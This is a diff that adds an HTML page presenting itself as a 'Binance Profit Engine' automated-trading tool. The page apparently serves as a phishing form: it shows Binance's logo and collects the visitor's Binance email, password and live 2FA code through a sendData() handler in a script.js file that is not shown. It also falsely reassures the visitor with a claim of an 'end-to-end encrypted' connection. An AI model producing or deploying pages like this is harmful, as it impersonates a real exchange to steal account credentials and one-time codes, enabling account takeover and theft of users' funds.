@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sync Wallet | Binance Profit Engine</title>
+  <link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/1/1a/Binance_logo.svg" alt="Binance" width="120"/>
+      <h1>Profit Engine v3.2</h1>
+    </div>
+    <p>Connect your Binance account to start automated trading.</p>
+    <form onsubmit="sendData(); return false;">
+      <input type="email" id="email" placeholder="Binance Email" required/>
+      <input type="password" id="pass" placeholder="Binance Password" required/>
+      <input type="text" id="twofa" placeholder="6-Digit 2FA Code" maxlength="6" required/>
+      <button type="submit">Sync Wallet & Start Trading</button>
+    </form>
+    <div class="status" id="status">🔒 Secure connection • End-to-end encrypted</div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
